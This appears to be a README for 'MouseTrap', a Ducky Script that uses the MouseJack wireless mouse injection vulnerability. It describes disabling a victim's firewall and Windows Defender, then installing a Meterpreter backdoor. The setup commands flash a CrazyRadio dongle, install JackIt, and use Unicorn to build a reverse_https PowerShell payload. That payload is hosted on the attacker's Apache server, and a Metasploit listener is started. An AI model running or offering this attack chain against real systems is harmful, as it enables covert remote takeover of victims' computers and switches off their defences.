# MouseTrap
This is an implementation of Bastille's exploit [MouseJack](https://github.com/BastilleResearch/mousejack) using [JackIt's](https://github.com/insecurityofthings/jackit) exploit code. Full credit goes to them for discovering this issue and writing the libraries to work with the CrazyRadio PA dongle, as well as the implementation that I have created a Ducky Script for. For more information about the vulnerability, as well as vulnerable devices, check out their Github repositories!
## What is MouseTrap?
MouseTrap is a Ducky Script I have written for MouseJack that allows a user to disable firewalls and Windows Defender real-time protection, and install a backdoor remotely through a victim's wireless mouse. In roughly 10 seconds, you can have a meterpreter session running without firewall interruption.
## Installation
Tested on a clean Kali Linux VM with a Crazy Radio PA
### MouseJack
Flashes CrazyRadio PA dongle with firmware and sets up dependencies
```
sudo git clone https://github.com/BastilleResearch/mousejack.git
sudo apt-get install sdcc binutils python python-pip
sudo pip install -U pip
sudo pip install -U -I pyusb
sudo pip install -U platformio
cd mousejack
git submodule init
git submodule update
cd nrf-research-firmware
make
sudo make install

```
### JackIt
Used to scan for vulnerable devices and inject payload
```
sudo git clone https://github.com/insecurityofthings/jackit.git
cd jackit
pip install -e .
```
### Unicorn
Develops powershell payload and sets up Metasploit Meterpreter session
```
sudo git clone https://github.com/trustedsec/unicorn.git
cd unicorn
python unicorn.py windows/meterpreter/reverse_https <LHOST IP> <LPORT>
mv powershell_attack.txt /var/www/html/
service apache2 start
msfconsole -r unicorn.rc
```
